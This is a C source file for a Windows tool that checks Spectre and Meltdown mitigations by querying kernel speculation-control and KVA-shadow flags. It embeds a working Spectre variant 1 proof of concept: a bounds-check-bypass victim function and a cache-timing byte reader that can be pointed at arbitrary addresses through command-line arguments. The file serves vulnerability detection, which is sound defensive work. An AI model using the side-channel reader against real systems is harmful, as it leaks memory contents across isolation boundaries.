/*++

Copyright (c) Alex Ionescu, Eugnis and Thomas Poetter.  All rights reserved.

Module Name:

    spectre-meltdown-check.c

Abstract:

    This module implements a checker app for CVE-2017-5754 and CVE-2017-5715

Authors:

    Alex Ionescu (@aionescu) 04-Jan-2018 - Initial version
	Eugnis					 05-Jan-2018 - Alternative initial version
	Thomas Poetter			 08-Jan-2018 - Extended combined version

Environment:

    User mode only.

Compile:

    cl  -MT spectre-meltdown-check.c LIBCMT.LIB ntdll.lib
	
URLs:
https://github.com/Eugnis/spectre-attack
https://github.com/ionescu007/SpecuCheck
https://github.com/compris-com/spectre-meltdown-checker
	
--*/

//
// OS Headers
//
#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */ 
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

//
// Internal structures and information classes
//
#define SystemSpeculationControlInformation (SYSTEM_INFORMATION_CLASS)201
typedef struct _SYSTEM_SPECULATION_CONTROL_INFORMATION
{
    struct
    {
        ULONG BpbEnabled : 1;
        ULONG BpbDisabledSystemPolicy : 1;
        ULONG BpbDisabledNoHardwareSupport : 1;
        ULONG SpecCtrlEnumerated : 1;
        ULONG SpecCmdEnumerated : 1;
        ULONG IbrsPresent : 1;
        ULONG StibpPresent : 1;
        ULONG SmepPresent : 1;
        ULONG Reserved : 24;
    } SpeculationControlFlags;
} SYSTEM_SPECULATION_CONTROL_INFORMATION, *PSYSTEM_SPECULATION_CONTROL_INFORMATION;

#define SystemKernelVaShadowInformation     (SYSTEM_INFORMATION_CLASS)196
typedef struct _SYSTEM_KERNEL_VA_SHADOW_INFORMATION
{
    struct
    {
        ULONG KvaShadowEnabled : 1;
        ULONG KvaShadowUserGlobal : 1;
        ULONG KvaShadowPcid : 1;
        ULONG KvaShadowInvpcid : 1;
        ULONG Reserved : 28;
    } KvaShadowFlags;
} SYSTEM_KERNEL_VA_SHADOW_INFORMATION, *PSYSTEM_KERNEL_VA_SHADOW_INFORMATION;

//
// ANSI Check
//
BOOL g_SupportsAnsi;

//
// Welcome Banner
//
const WCHAR WelcomeString[] =
    L"Spectre-Meltdown-Check v1.0.0   --   Copyright(c) 2018 Alex Ionescu, Eugnis and Thomas Poetter. Based on:\n"
    L"https://ionescu007.github.io/SpecuCheck/  --  @aionescu\n"
	L"https://github.com/Eugnis/spectre-attack\n"
	L"https://github.com/compris-com/spectre-meltdown-checker\n"
    L"-------------------------------------------------------\n\n";

//
// Error String
//
const WCHAR UnpatchedString[] =
    L"Your system either does not have the appropriate patch, "
    L"or it may not support the information class required.\n";

//
// KVA Status String
//
const WCHAR g_KvaStatusString[] =
    L"%sMitigations for %sCVE-2017-5754 [rogue data cache load]%s\n"
    L"-------------------------------------------------------\n"
    L"[-] Kernel VA Shadowing Enabled:                    %s%s\n"
    L" ├───> with User Pages Marked Global:               %s%s\n"
    L" └───> with PCID Flushing Optimization (INVPCID):   %s%s\n\n";

//
// Speculation Control Status String
//
const WCHAR g_SpecControlStatusString[] =
    L"%sMitigations for %sCVE-2017-5715 [branch target injection]%s\n"
    L"-------------------------------------------------------\n"
    L"[-] Branch Prediction Mitigations Enabled:          %s%s\n"
    L" ├───> Disabled due to System Policy (Registry):    %s%s\n"
    L" └───> Disabled due to Lack of Microcode Update:    %s%s\n"
    L"[-] CPU Microcode Supports SPEC_CTRL MSR (048h):    %s%s\n"
    L" └───> Windows will use IBRS (01h):                 %s%s\n"
    L" └───> Windows will use STIPB (02h):                %s%s\n"
    L"[-] CPU Microcode Supports PRED_CMD MSR (049h):     %s%s\n"
    L" └───> Windows will use IBPB (01h):                 %s%s\n";

//
// Error codes used for clarity
//
typedef enum _SPC_ERROR_CODES
{
    SpcSuccess = 0,
    SpcFailedToOpenStandardOut = -2,
    SpcFailedToQueryKvaShadowing = -3,
    SpcFailedToQuerySpeculationControl = -4,
    SpcUnknownInfoClassFailure = -5,
} SPC_ERROR_CODES;

PCHAR
FORCEINLINE
GetResetString (
    VOID
    )
{
    return g_SupportsAnsi ? "\x1b[0m" : "";
}

PCHAR
FORCEINLINE
GetRedNoString (
    VOID
)
{
    return g_SupportsAnsi ? "\x1b[1;31m no" : " no";
}

PCHAR
FORCEINLINE
GetGreenYesString (
    VOID
    )
{
    return g_SupportsAnsi ? "\x1b[1;32myes" : "yes";
}

PCHAR
FORCEINLINE
GetRedYesString (
    VOID
)
{
    return g_SupportsAnsi ? "\x1b[1;31myes" : "yes";
}

PCHAR
FORCEINLINE
GetGreenNoString (
    VOID
)
{
    return g_SupportsAnsi ? "\x1b[1;32m no" : " no";
}

PCHAR
FORCEINLINE
GetCyanString (
    VOID
    )
{
    return g_SupportsAnsi ? "\x1b[1;36m" : "";
}


/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char secret[100];

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--)
	{
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--)
		{
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++)
		{
			if (j < 0 || results[i] >= results[j])
			{
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k])
			{
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int basic_check(int argc, char* argv[])
{
	//printf("Putting '%s' in memory\n", secret);
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int i, score[2], len = sizeof(secret);
	uint8_t value[2];
	int no_successes = 0, no_failures = 0;
	float success_rate;
	
	// initialize secret with ints from 0 to 100
	for (int i = 0; i < len; i++) {
		secret[i] = i;
	}
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf_s(argv[2], "%d", &len);
	}

	printf("Reading/guessing %d bytes:\n", len);
	while (--len >= 0)
	{
		readMemoryByte(malicious_x++, value, score);
		score[0] >= 2 * score[1] ? no_successes++ : no_failures++;
	}
	success_rate = (float) no_successes / (no_successes + no_failures);
	printf("Success rate: %1.2f%% [ %d+ vs %d- ]\n", success_rate * 100, no_successes, no_failures);
#ifdef _MSC_VER
	//printf("Press ENTER to continue/exit\n");
	//getchar();	/* Pause Windows console */
#endif
	return (no_successes > no_failures);
}

int main(int argc, char* argv[])
{
    HANDLE hStdOut;
    NTSTATUS status;
    BOOL boolResult;
    SYSTEM_KERNEL_VA_SHADOW_INFORMATION kvaInfo;
    SYSTEM_SPECULATION_CONTROL_INFORMATION specInfo;
    SPC_ERROR_CODES errorCode;
    WCHAR stateBuffer[1024];
    INT charsWritten;
	int retCode;

	retCode = basic_check(argc, argv);
    //
    // Open the output handle -- also not much we can do if this fails
    //
    hStdOut = CreateFile(L"CONOUT$",
                         GENERIC_WRITE,
                         0,
                         NULL,
                         OPEN_EXISTING,
                         0,
                         NULL);
    if (hStdOut == INVALID_HANDLE_VALUE)
    {
        hStdOut = INVALID_HANDLE_VALUE;
        //errorCode = SpcFailedToOpenStandardOut;
		printf("Failed To Open Standard-Out\n");
		hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
		if (hStdOut == INVALID_HANDLE_VALUE) goto Exit;
    }

    //
    // Enable ANSI on Windows 10 if supported
    //
#ifndef ENABLE_VIRTUAL_TERMINAL_PROCESSING
#define ENABLE_VIRTUAL_TERMINAL_PROCESSING 0x0004
#endif
    g_SupportsAnsi = SetConsoleMode(hStdOut,
                                    ENABLE_PROCESSED_OUTPUT |
                                    ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    //
    // We now have display capabilities -- say hello!
    //
    WriteConsole(hStdOut, WelcomeString, ARRAYSIZE(WelcomeString) - 1, NULL, NULL);

    //
    // Get the KVA Shadow Information
    //
    status = NtQuerySystemInformation(SystemKernelVaShadowInformation,
                                      &kvaInfo,
                                      sizeof(kvaInfo),
                                      NULL);
    if (status == STATUS_INVALID_INFO_CLASS)
    {
        //
        // Print out an error if this failed
        //
        WriteConsole(hStdOut,
                     UnpatchedString,
                     ARRAYSIZE(UnpatchedString) - 1,
                     NULL,
                     NULL);
        errorCode = SpcFailedToQueryKvaShadowing;
        goto Exit;
    }
    if (status == STATUS_NOT_IMPLEMENTED)
    {
        //
        // x86 Systems without the mitigation active
        //
        RtlZeroMemory(&kvaInfo, sizeof(kvaInfo));
    }
    else if (!NT_SUCCESS(status))
    {
        errorCode = SpcUnknownInfoClassFailure;
        goto Exit;
    }

    //
    // Print status of KVA Features
    //
    charsWritten = swprintf(stateBuffer,
                            ARRAYSIZE(stateBuffer),
                            g_KvaStatusString,
                            GetResetString(),
                            GetCyanString(),
                            GetResetString(),
                            kvaInfo.KvaShadowFlags.KvaShadowEnabled ?
                               GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            kvaInfo.KvaShadowFlags.KvaShadowUserGlobal ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            kvaInfo.KvaShadowFlags.KvaShadowPcid ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            kvaInfo.KvaShadowFlags.KvaShadowInvpcid ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString());
    WriteConsole(hStdOut, stateBuffer, charsWritten, NULL, NULL);

    //
    // Get the Speculation Control Information
    //
    status = NtQuerySystemInformation(SystemSpeculationControlInformation,
                                      &specInfo,
                                      sizeof(specInfo),
                                      NULL);
    if (status == STATUS_INVALID_INFO_CLASS)
    {
        //
        // Print out an error if this failed
        //
        WriteConsole(hStdOut,
                     UnpatchedString,
                     ARRAYSIZE(UnpatchedString) - 1,
                     NULL,
                     NULL);
        errorCode = SpcFailedToQuerySpeculationControl;
        goto Exit;
    }
    else if (!NT_SUCCESS(status))
    {
        errorCode = SpcUnknownInfoClassFailure;
        goto Exit;
    }

    //
    // Print status of Speculation Control Features
    //
    charsWritten = swprintf(stateBuffer,
                            ARRAYSIZE(stateBuffer),
                            g_SpecControlStatusString,
                            GetResetString(),
                            GetCyanString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.BpbEnabled ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.BpbDisabledSystemPolicy ?
                                GetRedYesString() : GetGreenNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.BpbDisabledNoHardwareSupport ?
                                GetRedYesString() : GetGreenNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.SpecCtrlEnumerated ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.IbrsPresent ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.StibpPresent ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.SpecCmdEnumerated ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString(),
                            specInfo.SpeculationControlFlags.SpecCmdEnumerated ?
                                GetGreenYesString() : GetRedNoString(),
                            GetResetString());
    WriteConsole(hStdOut, stateBuffer, charsWritten, NULL, NULL);

    //
    // This is our happy path 
    //
    errorCode = SpcSuccess;

Exit:
    //
    // Close output handle if needed
    //
	printf("\nClosing, return code (0 = secure, 1 = vulnerable): %d\n", retCode);
    if (hStdOut != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hStdOut);
    }

    //
    // Return the error code back to the caller, for debugging
    //
    return retCode;
}

